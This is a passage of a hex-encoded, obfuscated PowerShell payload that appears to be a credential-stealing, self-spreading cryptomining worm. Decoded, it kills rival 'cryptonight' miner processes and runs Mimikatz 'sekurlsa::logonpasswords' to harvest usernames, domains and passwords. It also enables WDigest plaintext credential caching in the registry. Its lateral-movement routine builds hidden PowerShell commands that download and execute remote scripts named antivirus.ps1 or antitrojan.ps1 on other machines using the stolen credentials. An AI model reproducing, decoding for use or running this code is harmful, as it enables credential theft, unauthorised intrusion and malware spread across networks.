,69 ,64,20,'2d', 46,'6f' ,72 , 63 ,65, 'd' ,'a' , 20 ,20 ,20,20 , 20 ,20, 20,20 , 20, 20 ,20 ,20,20, 20 ,20, 20 ,20 ,20,20 , 20, '7d' , 'd' , 'a', 20 , 20,20,20, 20 , 20 , 20, 20 , 20,20 , 20 ,20 ,20, 20 ,20 ,20 ,20, 20 , 20 ,20,69,66 , 28 , 28,24 , 50, 61,72 , 65 , '6e' ,74,50,72 ,'6f' , 63 ,65,73,73 ,49 , 64,20, '2d', '6e' ,65,20 ,24 ,'6e', 75 , '6c','6c' , 29 , 20 ,'2d', 61 , '6e' , 64 , 20,28 , 24,50 , 61, 72, 65 , '6e',74,50, 72 ,'6f' , 63,65 , 73 , 73,49, 64 , 20 ,'2d' , '6e', 65 , 20 ,22 ,22, 29,29 , '7b','d' ,'a' ,20,20 , 20 ,20,20 ,20 , 20, 20,20 , 20,20,20,20 ,20, 20 ,20 , 20 , 20 , 20 , 20 ,20 , 20 ,20,20 ,73, 74 ,'6f', 70, '2d' ,70,72,'6f',63,65, 73 , 73 , 20 , '2d' ,49, 64,20,24 ,50 , 61 , 72, 65, '6e' ,74,50,72, '6f', 63,65,73 , 73,49 ,64, 20,'2d' , 46,'6f' , 72,63,65,'d' , 'a',20,20, 20 ,20 ,20 ,20, 20 ,20,20, 20 , 20 , 20 ,20 , 20, 20 , 20,20 , 20, 20, 20 , '7d' , 'd' ,'a' ,20,20 ,20, 20,20 ,20 , 20 , 20 , 20 ,20,20 , 20,20 ,20, 20 ,20,'7d','d', 'a' , 20 ,20,20 , 20 ,20, 20 ,20 ,20 , 20,20 , 20, 20 , '7d', 'd', 'a',20 ,20 , 20,20, 20 , 20, 20 ,20, 20 , 20, 20,20,23,20, 66 , 69 ,'6c',65 ,'5f',73, 74 ,72,69 ,'6e', 67,'d', 'a' , 20 , 20 , 20,20 ,20 , 20, 20,20,20 ,20, 20,20,69 ,66, 28,28 , 24,70, 61,74,68, 20,'2d' , '6e', 65, 20,24 ,'6e', 75, '6c' ,'6c' , 29, 20 ,'2d' , 61 , '6e' , 64 ,20,28, 24,70, 61 ,74,68, 20 ,'2d' , '6e' , 65 ,20 , 22 ,22 ,29, 29,'7b','d' , 'a' , 20 ,20 , 20, 20,20 , 20,20 ,20 , 20, 20 ,20 , 20,20 ,20,20 , 20 ,69, 66 ,20 ,28,28, 47,65 ,74 , '2d', 49,74, 65,'6d', 20, 24 , 70, 61,74, 68 ,29 , '2e','6c' , 65,'6e' ,67 ,74,68, 20 , '2d' ,67, 74 ,20,32,'6d' , 62 , 29 , '7b' ,'d','a', 20,20, 20,20 , 20,20, 20 , 20 ,20 , 20 ,20,20,20, 20, 20, 20 ,20 , 20 , 20,20 , 24,74 ,'6d',70 ,43,'6f' , '6e' , 74,65,'6e',74, '3d', 66 ,69,'6e', 64,73,74 ,72 , 20, '2f',69 ,20 ,'2f' ,'6d',20 , '2f', 63 ,'3a', 22, 63,72 ,79 ,70,74 ,'6f','6e' ,69 , 67,68 ,74,22,20 ,22 , 24,70,61 ,74 , 68,22, 'd','a' ,20, 20,20 , 20 ,20 ,20 ,20, 20 , 20, 20 ,20 , 20 ,20 ,20, 20, 20 ,'7d',65 , '6c' , 73 ,65, '7b' , 'd' ,'a', 20 ,20, 20,20,20, 20 , 20,20,20 , 20, 20,20 ,20 ,20 ,20, 20 ,20, 20 ,20 , 20 , 24 , 74 , '6d' ,70,43, '6f' , '6e' ,74 , 65,'6e', 74,'3d' , 47 , 65, 74 , '2d' ,43,'6f' , '6e',74 , 65,'6e' , 74 ,20,'2d' ,70 ,61 , 74 ,68 ,20 ,24 ,70,61 , 74, 68 ,20,'7c' , 20,53 , 65 , '6c',65 ,63 , 74, '2d',53, 74 ,72 ,69,'6e',67, 20,'2d' , 70 , 61, 74 , 74 ,65 , 72, '6e' ,20 ,22,63, 72 , 79 ,70, 74, '6f', '6e' , 69,67, 68,74 ,22,'d' , 'a', 20,20 ,20,20,20,20,20 ,20,20,20, 20,20,20,20 ,20, 20,'7d','d' , 'a',20, 20 , 20,20 ,20 ,20 ,20, 20 ,20, 20,20,20 ,20,20,20 ,20 ,69 ,66, 28,28 , 24 ,74 ,'6d' ,70,43,'6f' ,'6e' , 74 ,65,'6e' , 74 , 20,'2d' , '6e',65 , 20,24 , '6e' ,75 , '6c' ,'6c', 29 ,20 , '2d', 61 , '6e' ,64,20 , 28 ,24,74, '6d' ,70 ,43 , '6f','6e',74 ,65 , '6e', 74,20 ,'2d' ,'6e' ,65, 20,22 , 22 ,29, 29 , '7b','d' , 'a',20 ,20, 20, 20 ,20, 20,20, 20, 20 , 20,20 , 20,20, 20 ,20,20,20 ,20,20 ,20, 24, 50 , 61,72 ,65,'6e', 74 , 50 , 72 ,'6f', 63,65,73, 73 ,49, 64 ,20 , '3d',20, 28 , 67,65 ,74 , '2d' ,77 ,'6d',69, '6f',62 ,'6a', 65, 63,74 , 20 ,'2d' , 43 ,'6c' ,61,73 ,73 ,20,57,69 ,'6e' ,33, 32, '5f' ,50, 72,'6f' ,63 ,65 , 73,73 , 20, '2d' , 46 , 69 , '6c', 74 , 65 ,72, 20 ,22, 50,72 , '6f',63,65 ,73 , 73 ,49 , 64 ,'3d' , 24, 69 , 64, 22 , 29, '2e' ,50,61,72, 65,'6e' ,74 , 50,72 ,'6f', 63, 65,73 , 73 , 49 ,64 , 'd' ,'a',20 ,20 ,20 ,20,20, 20, 20,20,20, 20 , 20 ,20,20, 20, 20, 20, 20 , 20 , 20 ,20,69 , 66 , 28 ,28 ,24 ,69 , 64 ,20 , '2d' ,'6e', 65 ,20 , 24 , '6e',75 , '6c' ,'6c' , 29 ,20,'2d' , 61 , '6e' ,64,20 ,28 , 24, 69, 64 ,20, '2d' ,'6e', 65 ,20, 22,22,29 , 29 , '7b','d','a',20 ,20,20, 20 ,20 ,20 ,20 , 20,20,20,20, 20 , 20 ,20,20, 20, 20,20,20, 20, 20 , 20, 20, 20,73, 74 , '6f',70 ,'2d', 70,72 ,'6f' ,63 , 65 ,73,73 , 20 , '2d',49,64, 20 , 24 ,69, 64 , 20, '2d', 46 ,'6f' ,72, 63, 65, 'd' , 'a' , 20,20 ,20 ,20 , 20, 20 , 20 ,20, 20 ,20 ,20, 20 , 20,20,20,20 ,20 ,20 ,20, 20, '7d', 'd' ,'a' , 20, 20 ,20 , 20 ,20 ,20,20 ,20 ,20,20, 20 , 20, 20, 20,20,20,20,20 , 20 ,20,69 , 66 , 28 , 28,24 , 50 ,61, 72 ,65, '6e' ,74 , 50 , 72,'6f',63, 65, 73 ,73 , 49, 64 ,20 ,'2d', '6e', 65 , 20 ,24 ,'6e', 75,'6c','6c', 29 ,20 , '2d', 61,'6e' , 64, 20 ,28,24 ,50,61,72 , 65, '6e', 74 ,50,72, '6f',63, 65 ,73,73, 49,64 ,20 , '2d','6e', 65,20 ,22 , 22 , 29 ,29 , '7b' ,'d' ,'a' ,20 , 20, 20,20 , 20 , 20,20 , 20 , 20 , 20, 20 ,20 , 20, 20,20, 20 , 20 , 20 ,20, 20,20 , 20 ,20,20,73,74, '6f', 70, '2d',70 ,72,'6f' , 63, 65 , 73 , 73 ,20, '2d',49 ,64 ,20 ,24 ,50, 61 ,72 ,65, '6e' ,74 , 50 , 72 ,'6f' , 63, 65, 73,73 , 49,64, 20 , '2d',46,'6f' ,72,63 ,65,'d','a' ,20,20 ,20,20 , 20, 20 ,20,20 ,20, 20 , 20, 20,20,20 , 20 , 20 ,20, 20, 20, 20 , '7d', 'd', 'a',20, 20 , 20, 20, 20 , 20 , 20, 20 , 20,20 ,20 ,20 ,20 , 20 , 20,20 , '7d','d', 'a' ,20 , 20,20,20, 20,20 ,20,20,20 ,20 , 20 , 20 , '7d' ,'d','a' ,20 ,20 ,20 ,20 , 20 ,20,20 ,20, '7d', 'd' , 'a',20,20, 20,20,'7d', 'd' , 'a' ,20,20, 20, 20 ,72 ,65,74 , 75, 72,'6e' ,20 ,31 ,'d','a','7d', 'd' ,'a' ,'d' , 'a' , 66,75, '6e', 63 ,74,69,'6f', '6e',20 ,47 ,65 , 74 ,'2d',63 , 72 ,65, 64, 73, 28, 24, 50, 45 ,42,79, 74 , 65 , 73 , 36,34,'2c' ,20, 24 , 50 ,45, 42,79 , 74, 65, 73 ,33, 32 ,29,'7b' ,'d', 'a', 9 , 24 , 63 ,63,'3d' , 49 , '4e' ,56,'6f', '6b' ,60,45,'2d',63 , '4f' ,'6d','4d' , 60,41, '6e', 64,20 , '2d' ,53,63 , 72,69, 70 , 74,42 ,'6c','6f' ,63 , '6b', 20, 24,52 ,65, '6d', '6f' , 74,65,53 ,63, 72, 69, 70 ,74 , 42, '6c','6f' ,63, '6b', 20 , '2d', 41 , 72 ,67,75 ,'6d' ,65 ,'6e' ,74 ,'4c', 69 , 73,74 ,20 , 40 ,28, 24, 50,45, 42 , 79, 74, 65 ,73, 36,34, '2c' ,20,24 , 50,45 ,42 , 79,74 ,65 , 73 , 33 , 32,'2c',20 , 28, 27,56, '6f',69, 27 ,'2b', 27, 64, 27 ,29, '2c' ,20 , 30,'2c' , 20 , 22, 22, '2c',20 ,28,27 , 73,65 ,'6b' ,27, '2b', 27 ,75 ,72, 27 ,'2b', 27, '6c' ,73,61 , '3a', '3a', '6c' ,'6f' , 67,'6f','6e',70 , 61,27,'2b' ,27, 73, 73,27, '2b', 27, 77,27,'2b',27 ,'6f', 72 ,64 , 73 ,20,65, 78 ,69 ,74 ,27 , 29 , 29,'d', 'a' ,20 , 20 , 20 ,20 , 24 , 63 ,73 , '3d', 24, 63 , 63, '2e' ,53 ,70 ,'6c' , 69 ,74 , 28,22 , 60,'6e' ,22, 29 , 'd' , 'a' , 20, 20,20 , 20 ,24,61 ,'3d' , 40, 28, 29, 'd' , 'a' , 9 ,24, '4e', 54 , '4c','4d' ,'3d',24 ,46,61,'6c',73, 65,'d', 'a',20 ,20 , 20,20 , 66 , '6f',72 , 20 , 28 ,24 , 69 , '3d', 30,'3b',24 ,69, 20, '2d' , '6c' ,65 ,20,24,63, 73 , '2e', 43 ,'6f' ,75 ,'6e' ,74,'2d', 31 , '3b', 20 ,24 ,69 , '2b' , '3d', 31, 29 , 'd', 'a' ,20, 20 ,20,20, '7b' , 'd' , 'a',20 , 20, 20,20,20 ,20, 20 ,20,69,66, 20,28 ,24 , 63, 73 , '5b' ,24,69,'5d', '2e', 63, '6f' , '6e',74 ,61 , 69,'6e' , 73 , 28, 28, 27 ,55 , 73, 27 ,'2b' ,27 ,65,27 , '2b',27, 72 , '6e' ,61,'6d' ,65 ,27 ,29 , 29 , 20 , '2d', 61 ,'6e' ,64, 20,24,63,73 , '5b' , 24,69 , '2b', 31,'5d' , '2e',63 , '6f', '6e' , 74 ,61, 69,'6e' ,73,28 , 28, 27,44,'6f', '6d' , 61,69 , 27, '2b', 27 ,'6e',27 , 29,29 ,20,'2d',61 ,'6e' ,64,20 , 24,63 ,73 , '5b' ,24, 69,'2b' , 32 , '5d','2e' ,63, '6f','6e', 74, 61 , 69,'6e', 73 ,28 , 28 ,27, 50, 61, 73,73, 77, '6f', 72, 27 ,'2b',27 , 64,27,29, 29 ,29, 'd' , 'a' ,20, 20, 20, 20 , 20 , 20 ,20 ,20,'7b', 'd' ,'a' , 20 , 20,20 ,20, 20 ,20 ,20,20, 20 , 20, 20 , 20 , 24, 68 , '3d' ,20 , 24,63 , 73 , '5b',24 , 69 ,'5d', '2e',73 , 70,'6c', 69 , 74, 28 ,22 , '3a' , 22, 29, '5b','2d' , 31 , '5d' ,'2e' ,74,72 ,69, '6d' , 28,29,'2b',27, 20, 27, '2b', 24 , 63,73 , '5b' , 24, 69 , '2b' , 31 , '5d','2e' , 73 , 70 ,'6c' , 69, 74 , 28, 22 ,'3a' , 22 , 29 , '5b', '2d',31,'5d', '2e',74 ,72, 69,'6d', 28 , 29, '2b' ,27 ,20, 27, '2b', 24 , 63, 73, '5b', 24, 69 ,'2b', 32 , '5d' , '2e' ,73, 70, '6c',69 ,74 , 28, 22, '3a' , 22, 29,'5b', '2d' ,31, '5d' , '2e' , 74 , 72,69, '6d' ,28 ,29 ,'d' , 'a' , 20 , 20, 20,20,20 , 20 ,20 , 20,20,20,20 , 20,69 , 66 ,20, 28 , 24 ,68, '2e' , 73,70, '6c',69,74, 28 , 27,20 ,27 ,29,'5b','2d' , 31,'5d',20 ,'2d','6e',65 , 20 , 28 , 27, 28, '4e',55,'4c' , 27,'2b' ,27,'4c', 29 , 27 ,29,20,'2d' ,61 ,'6e' , 64 ,20,24,68,'2e' , 73,70 , '6c', 69 , 74, 28,27,20,27 ,29 ,'5b',30, '5d','5b','2d',31,'5d', 20 , '2d', '6e', 65, 20,22, 60 ,24, 22 ,20 , '2d' , 61, '6e' ,64, 20,20,24 ,61, 20,'2d' ,'6e','6f' , 74, 63 , '6f' , '6e' , 74 ,61,69,'6e', 73, 20,24 , 68 , 29, '7b' ,'d', 'a' , 20, 20,20 ,20 , 20,20 , 20,20, 20 , 20 ,20 ,20 , 20 ,20, 20,20,24 , 61,'2b', '3d' ,24,68,'d','a' , 20,20, 20 , 20 , 20,20, 20,20 , 20,20 , 20 ,20, '7d','d' ,'a',20,20,20, 20 ,20, 20 , 20, 20, '7d', 'd' ,'a', 20, 20,20,20 ,'7d' ,'d' , 'a', 20, 20, 20 ,20 , 69, 66,20 , 28 , 24 , 61,'2e', 63,'6f', 75 , '6e' ,74,20 ,'2d',65,71, 20,30, 29,'d' , 'a' , 20,20, 20 , 20 ,'7b' ,'d', 'a',20,20 , 20 ,20, 20 ,20 , 20, 20,24, '4e' ,54,'4c', '4d','3d' ,24,54, 72 , 75 ,65, 'd', 'a',20 ,20 , 20,20 ,20, 20, 20,20,24,74 , '3d' , 67,60,65, 74 , '2d' ,49,54, 60, 45,'4d' ,50 ,72 ,'4f', 50 ,60 , 65, 52,54 ,59, 20 , '2d' ,50 , 61, 74 ,68, 20 ,48 , '4b' ,'4c' ,'4d' ,'3a', '5c' ,53,59, 53,54,45,'4d' , '5c', 43 , 75 ,72, 72 , 65 , '6e' , 74, 43,'6f' ,'6e' , 74,72, '6f', '6c' ,53,65,74, '5c', 43 ,'6f' , '6e', 74, 72,'6f' , '6c' ,'5c',53, 65, 63 , 75 , 72 , 69,74,79,50 , 72, '6f',76,69, 64, 65,72, 73 , '5c' ,57 ,44,69 ,67 , 65 ,73,74 ,20, '2d', '4e', 61 ,'6d', 65 , 20, 55,73, 65, '4c', '6f',67 ,'6f' , '6e' , 43, 72 , 65, 64 ,65 , '6e',74 ,69, 61,'6c', 'd' ,'a' , 20 ,20, 20 , 20 ,20 ,20, 20, 20 , 69 ,66 ,20,28 ,24, 74 , 20 , '2d' , 65 , 71 , 20,24 ,'6e', 75 , '6c', '6c',29, 'd' , 'a' , 20, 20,20, 20,20, 20 ,20,20,'7b' ,20 ,'4e',65 , 57, '2d', 49 ,74 , 65, '6d' , 60,70,52, '4f' ,60,50, 60 ,65 , 60 ,52,54 ,79,20,'2d' ,50,61, 74 ,68 ,20,48 ,'4b', '4c' ,'4d' , '3a' ,'5c' ,53,59,53 ,54, 45,'4d','5c' , 43 , 75 , 72,72 , 65 ,'6e' ,74,43, '6f' , '6e' , 74, 72 , '6f', '6c',53 ,65 ,74, '5c' ,43,'6f', '6e' ,74 , 72, '6f' , '6c','5c' ,53,65 ,63 , 75, 72 , 69,74, 79 , 50 ,72, '6f' ,76, 69, 64 ,65 ,72, 73,'5c', 57 ,44 , 69, 67,65,73 , 74,20 ,'2d','4e' , 61 ,'6d' , 65,20,55 ,73 ,65,'4c','6f' , 67 , '6f' ,'6e' , 43 ,72 ,65 ,64,65 ,'6e',74 , 69 ,61 ,'6c', 20, '2d' ,54,79,70,65 , 20, 44 , 57 , '4f',52 ,44 ,20 ,'2d',56 ,61,'6c', 75 , 65, 20 ,31 ,20, '7c',20 ,'6f', 55, 54 ,'2d' ,60 , '4e' , 60, 55,'6c' ,'6c','7d','d','a' ,20 ,20,20 , 20 ,20 ,20,20, 20 ,65 , '6c' ,73 , 65,69, 66, 20 , 28,24,74 , '2e', 55,73 , 65 , '4c', '6f', 67,'6f' ,'6e' ,43 , 72 , 65 , 64,65 ,'6e' ,74,69,61, '6c', 20, '2d', 65,71,20, 30,29 ,'7b' , 'd', 'a', 20, 20,20, 20,20,20 ,20 , 20 , 53 , 45 ,74,'2d', 49 ,54, 65 ,60 , '4d',60, 50,52,60, '6f' , 50 , 45, 60 , 52 ,74 , 79, 20 ,20 ,'2d', 50,61 , 74 ,68 ,20, 48 ,'4b','4c','4d' ,'3a','5c',53 , 59 , 53 , 54,45 , '4d' , '5c' ,43, 75 ,72,72, 65, '6e' , 74 ,43 , '6f','6e', 74 ,72 ,'6f' , '6c',53, 65 ,74, '5c', 43 , '6f' ,'6e',74, 72 , '6f', '6c' , '5c',53,65,63 , 75 , 72 ,69, 74 , 79,50 ,72, '6f', 76,69,64 , 65,72,73,'5c' ,57 , 44, 69 ,67 , 65 , 73, 74 ,20,'2d','4e' , 61 ,'6d' , 65 ,20,55,73 , 65,'4c','6f', 67, '6f','6e',43, 72, 65 , 64 , 65 , '6e', 74 , 69 ,61,'6c',20 ,'2d',54, 79, 70, 65 ,20,44 , 57, '4f', 52 , 44,20, '2d' ,56 ,61,'6c' , 75, 65,20 ,31, 'd' , 'a', 20 ,20 ,20 ,20 , 20,20,20,20, '7d', 'd','a' ,'d','a',20 , 20 ,20 , 20, 20, 20,20,20 , 24 ,61, '3d' , 40, 28, 29,'d' , 'a', 20 ,20 ,20 ,20 ,20, 20 , 20 ,20 ,66, '6f',72 ,20 , 28 ,24, 69, '3d', 30,'3b' , 24 , 69, 20 , '2d','6c', 65 ,20, 24,63, 73 ,'2e',43 ,'6f' ,75 , '6e' ,74, '2d',31 , '3b' , 20 , 24,69 ,'2b' , '3d' ,31, 29 , 'd', 'a' , 20, 20, 20 ,20 , 20 ,20, 20,20,'7b' , 'd','a', 20,20 ,20, 20 ,20, 20 , 20 , 20 ,20 , 20 ,20, 20 , 69 ,66 ,20 , 28 ,24, 63 ,73 ,'5b' ,24,69 ,'5d' , '2e' , 63 ,'6f','6e' , 74 , 61,69,'6e',73 , 28,28 , 27, 55,27, '2b',27, 73, 65, 72, 27 , '2b', 27,'6e', 61 ,'6d', 65 ,27, 29 ,29 ,20,'2d' ,61 ,'6e' ,64, 20, 24 , 63, 73,'5b',24 , 69, '2b' ,31 ,'5d' ,'2e', 63,'6f','6e', 74, 61,69 , '6e',73, 28,28 ,27 ,44 ,27 , '2b' ,27, '6f' , '6d' ,61 ,69,27, '2b' ,27,'6e',27 ,29 ,29,20 , '2d', 61,'6e',64, 20 ,24 ,63,73 ,'5b',24, 69, '2b',32 , '5d' , '2e',63, '6f' ,'6e',74 , 61 , 69 ,'6e',73, 28 , 27 , '4c','4d',27, 29,29,'d' , 'a', 20 ,20, 20 ,20, 20 ,20 , 20, 20 , 20,20, 20 ,20 ,'7b' , 'd','a', 20 , 20,20 ,20, 20 , 20 ,20,20,20 ,20, 20,20 , 20 , 20,20, 20,69, 66 , 20 , 28 ,21 ,24, 63,73 , '5b' ,24 ,69, '2b' ,32,'5d', '2e' ,63, '6f','6e', 74, 61 ,69, '6e' , 73 ,28 , 28 ,27 , '4e', 54, 27, '2b' ,27 , '4c' , '4d', 27,29,29 , 20 ,'2d' ,61 ,'6e',64 ,20, 24 , 63 , 73 , '5b', 24, 69 , '2b' ,33 , '5d', '2e', 63, '6f' ,'6e',74 ,61 , 69, '6e' ,73, 28 ,28,27 ,'4e',54 , 27 , '2b',27, '4c','4d', 27 ,29 ,29,20,29 , '7b', 24, '6e', '6d', '3d', 24,63 , 73,'5b', 24 ,69 , '2b', 33, '5d', '2e', 73, 70, '6c',69, 74 ,28,22,'3a', 22 , 29 ,'5b' ,'2d',31 ,'5d' ,'2e' ,74, 72,69 ,'6d',28, 29, '7d' , 'd' , 'a' ,20, 20,20 ,20, 20, 20, 20 , 20 , 20,20 ,20 ,20 , 20,20, 20, 20 , 65, '6c' ,73 , 65 , '7b' ,24 ,'6e','6d', '3d',24,63, 73, '5b',24 ,69 , '2b' ,32 ,'5d', '2e', 73 ,70, '6c',69, 74 , 28, 22 ,'3a' ,22,29, '5b','2d',31, '5d','2e' , 74 ,72 , 69 , '6d', 28 , 29,'7d' ,'d', 'a', 20 ,20,20 , 20,20 , 20 , 20, 20 , 20,20 ,20, 20,20 ,20 , 20 ,20 ,24 , 68,'3d' , 20 ,24 ,63 , 73, '5b',24,69, '5d','2e',73 , 70 , '6c', 69 ,74 , 28, 22, '3a', 22 , 29 , '5b','2d',31 ,'5d','2e' , 74, 72 , 69 ,'6d', 28,29 ,'2b' , 27, 20, 27 ,'2b' , 24,63 ,73 ,'5b', 24,69 , '2b', 31 ,'5d' ,'2e', 73 , 70 , '6c', 69,74 ,28 ,22,'3a',22,29 ,'5b' ,'2d' , 31, '5d', '2e' , 74,72, 69 , '6d' ,28 ,29,'2b',27 , 20 , 27, '2b' ,24,'6e' ,'6d', 'd' ,'a',20 ,20,20,20,20 , 20 , 20, 20,20 ,20 , 20,20, 20,20 ,20, 20 , 69 ,66,20 ,28, 24,68, '2e' ,73, 70 ,'6c',69 ,74, 28,27, 20 ,27 ,29, '5b', '2d',31 ,'5d' ,20, '2d' ,'6e', 65 ,20 ,28,27 ,28,27, '2b' ,27,'4e',55, '4c' , '4c',29,27 , 29 , 20 ,'2d' , 61 , '6e', 64 ,20, 24,68 ,'2e' ,73,70,'6c' , 69, 74 ,28,27 ,20,27 , 29,'5b' , 30 ,'5d' ,'5b' , '2d' ,31 , '5d',20, '2d' ,'6e',65, 20, 22,60,24 ,22 ,20, '2d',61,'6e' , 64,20, 20, 24,61, 20 , '2d' ,'6e' , '6f',74 ,63 ,'6f','6e', 74, 61, 69 ,'6e', 73 ,20 ,24 , 68 , 29, '7b', 'd' ,'a' , 20, 20,20, 20 ,20, 20 ,20 , 20,20,20,20, 20 , 20 ,20, 20, 20 ,20 ,20 , 20,20, 24,61 ,'2b' , '3d',24,68,'d' , 'a', 20 ,20, 20,20 ,20,20 , 20 , 20 , 20 , 20,20, 20 ,20 , 20 , 20 ,20 , '7d', 'd' ,'a', 20, 20 , 20, 20,20 , 20 , 20 ,20, 20 , 20,20, 20 , '7d','d','a' ,20, 20, 20 ,20 ,20 ,20 , 20 ,20 ,'7d' , 'd','a' , 20, 20 ,20, 20 , 20, 20, '7d','d' , 'a',20,20, 20 ,20,72 , 65,74,75, 72 , '6e', 20 , 24 ,61, '2c' , 20, 24,'4e' , 54 , '4c','4d', 'd' , 'a' , '7d', 'd','a' , 'd' , 'a' ,66 ,75, '6e', 63 , 74 , 69 ,'6f' , '6e',20 ,74 ,65,73,74, '2d', 69,70 ,'d', 'a', '7b', 'd' ,'a', 20 , 20, 20, 20, 70 , 61 ,72 , 61 , '6d', 'd','a',20,20,20 ,20, 28 , 'd' ,'a', 20, 20 ,20 , 20 , 20 ,20 , 20,20 ,'5b',50, 61 ,72,61 , '6d', 65, 74,65 ,72,28,'4d', 61,'6e' , 64 , 61,74,'6f' ,72,79, 20, '3d' ,20, 24,46, 61 ,'6c' , 73,65, 29 ,'5d' ,'d','a',20,20 , 20, 20,20, 20 , 20 , 20 , '5b' ,73 ,74, 72 ,69, '6e', 67 , '5d' ,24, 69 , 70 , '2c','d','a' , 20, 20, 20,20, 20, 20,20,20,'5b',50 ,61,72, 61,'6d' , 65, 74 ,65 , 72 , 28 ,'4d' , 61,'6e' , 64 , 61 , 74,'6f',72,79,20,'3d' , 20 , 24 , 46 , 61 , '6c', 73, 65 , 29,'5d','d', 'a',20 ,20,20, 20 ,20, 20, 20 , 20 ,'5b' , 61,72 , 72, 61, 79, '5d',24, 63,72 , 65, 64 , 73 , '2c', 'd', 'a' ,20,20 ,20 , 20 , 20,20 ,20 , 20 , '5b',50, 61 , 72, 61,'6d', 65, 74 ,65 ,72,28,'4d' ,61, '6e',64 , 61, 74 , '6f', 72 , 79, 20 ,'3d' ,20 , 24,46,61 ,'6c' , 73 ,65, 29 , '5d' , 'd' ,'a' , 20 , 20 ,20,20,20,20 ,20,20 ,'5b', 73 , 74,72, 69 ,'6e' ,67,'5d' ,24 , '6e', 69 ,63,'2c' , 'd','a' , 9 ,9,'5b', 50 ,61, 72,61 , '6d',65,74 ,65,72, 28 ,'4d', 61, '6e', 64, 61,74 , '6f', 72,79,20, '3d',20 , 24, 46 ,61 , '6c' , 73, 65, 29,'5d' , 'd', 'a', 20,20 ,20 ,20, 20,20 ,20 , 20 , '5b',69 , '6e',74, '5d', 24 , '6e',74 ,'6c','6d' ,'d','a', 20,20, 20 ,20,29,'d' ,'a' , 20, 20 , 20, 20, 20 ,50 , 72, '6f',63, 65 ,73,73,'d' , 'a',20 ,20 ,20 ,20,'7b','d' ,'a','d','a',20 , 20 ,20, 20 , 20 , 20 ,20,20 , 66, '6f',72 , 65 , 61 ,63 , 68 , 20 , 28 ,24 , 63 , 20 ,69, '6e',20 , 24 , 63,72,65, 64 , 73 , 29,'d' ,'a' , 20 , 20 ,20,20 , 20 , 20 , 20 ,20 ,'7b', 'd','a', 20,20,20 ,20,20 , 20 ,20, 20 , 20,20,20,20 , 24, 55,73,65, 72, '3d' , 24 , 63,'2e' , 73 , 70 , '6c' ,69,74,28,22 ,20 , 22 , 29, '5b' , 30,'5d' ,'d','a', 20 , 20, 20 ,20,20 ,20 , 20, 20, 20,20, 20,20, 24 ,64, '6f' , '6d' ,61, 69, '6e', '3d',24,63, '2e',73,70 , '6c' , 69,74 , 28,22, 20 ,22,29, '5b', 31, '5d' ,'d' ,'a' ,20,20 , 20, 20,20 ,20,20,20,20,20,20 , 20 , 24, 70, 61 ,73 , 73,77,64 , '3d',24,63 ,'2e' , 73 ,70 ,'6c' , 69, 74,28, 22, 20,22 , 29,'5b',32,'5d' , 'd' , 'a',20 , 20 , 20,20 , 20 , 20,20 , 20, 20 ,20 ,20, 20, 24,70 ,61,73 ,73 ,77 ,'6f',72,64 ,20, '3d',20 ,43 ,'6f','4e',76,65 ,72 ,54,54 , 60,'4f','2d' , 60,53 ,65 , 43,75,52 , 45 ,60,73, 60,54 , 72 ,60,49 ,'4e', 47, 20 ,24,70 ,61 , 73 ,73, 77 , 64 , 20, '2d' , 61 , 73, 70 , '6c',61 ,69, '6e' ,74, 65 ,78,74,20 , '2d' , 66, '6f' , 72,63 , 65, 'd' ,'a' ,20,20 ,20,20, 20, 20,20 , 20 ,20,20,20 , 20 ,24, 63 ,'6d',64, 20 , '3d', 22, 63 ,'6d', 64,20, '2f' ,63, 20 , 70 ,'6f' ,77 ,65 , 72,73, 68,65 ,'6c', '6c', '2e' , 65 , 78 , 65 ,20, '2d', '4e' ,'6f',50,20 ,'2d' , '4e','6f' ,'6e', 49, 20 ,'2d',57,20,48, 69, 64, 64 , 65 , '6e' ,20 ,60, 22,69, 66 , 28, 28 ,47 ,65,74 , '2d', 57,'6d', 69 ,'4f' , 62,'6a', 65 , 63, 74 ,20 , 57 , 69 , '6e' ,33 , 32 , '5f', '4f', 70 , 65, 72 , 61, 74,69,'6e' ,67, 53, 79, 73,74,65,'6d' ,29,'2e' ,'6f' ,73,61,72 ,63 , 68 ,69 ,74, 65 , 63,74, 75 , 72,65,'2e', 63 ,'6f','6e' , 74, 61, 69 , '6e' ,73,28,27, 36,34,27 ,29 , 29,'7b' ,49, 45 , 58 ,28 , '4e' ,65 , 77 ,'2d', '4f' ,62 , '6a', 65 , 63 , 74 ,20, '4e',65 ,74, '2e', 57, 65 , 62 ,43,'6c' , 69 ,65 , '6e' , 74 , 29 ,'2e' , 44 , '6f',77 ,'6e','6c', '6f',61, 64, 53, 74 ,72 , 69, '6e' ,67 ,28 , 27 ,68, 74,74, 70 ,'3a' , '2f' ,'2f', 24,'6e', 69,63 ,'2f' , 61 ,'6e' , 74 ,69,76 ,69, 72,75 , 73 ,'2e' , 70 ,73 , 31,27,29,'7d',65,'6c' ,73 , 65,'7b' , 49 , 45 ,58 , 28, '4e' ,65,77, '2d' ,'4f' ,62 ,'6a' ,65, 63 ,74,20 , '4e' , 65 ,74 , '2e' ,57 , 65 , 62 , 43,'6c' , 69,65 ,'6e', 74,29 , '2e', 44,'6f' ,77, '6e', '6c' , '6f' ,61 , 64 ,53, 74 ,72 , 69,'6e',67 , 28 , 27,68 , 74 , 74 ,70 ,'3a' ,'2f' ,'2f', 24 ,'6e' , 69 ,63,'2f' , 61,'6e', 74 , 69,74, 72, '6f', '6a' ,61,'6e','2e' , 70 , 73, 31,27,29 , '7d',60, 22 ,22 ,'d' , 'a' ,'d', 'a' ,20 ,20,20 , 20 , 20 , 20 ,20 ,20, 20, 20 ,20, 20 ,69 , 66, 20 , 28 , 21 ,24,'6e' , 74,'6c' ,'6d', 29 , 'd', 'a', 20, 20,20 , 20,20,20 , 20 , 20 , 20 ,20 , 20, 20, '7b' ,'d' , 'a', 9,9,9 , 9,24 , 63 ,72, 65,64,20, '3d' ,20 ,'6e', 60 ,45 , 77, '2d' ,'6f' ,62, '6a' ,60 , 45, 43 , 54 ,20,'2d' , 54, 79 , 70 ,65 , '6e' , 61 ,'6d', 65, 20 , 53,79, 73, 74, 65 , '6d','2e', '4d', 61 , '6e' ,61 , 67 ,65 ,'6d' ,65,'6e' ,74 , '2e' ,41 , 75,74, '6f','6d',61 ,74 ,69,'6f' ,'6e' , '2e', 50 ,53, 43 , 72 ,65 ,64 , 65 , '6e' , 74 ,69,61 ,'6c',20 ,'2d' ,61 , 72, 67 ,75,'6d',65,'6e',74,'6c' , 69, 73 ,74,20 ,24,55 , 73 ,65 ,72 ,'2c', 24, 70, 61 ,73, 73,77 , '6f' ,72 , 64 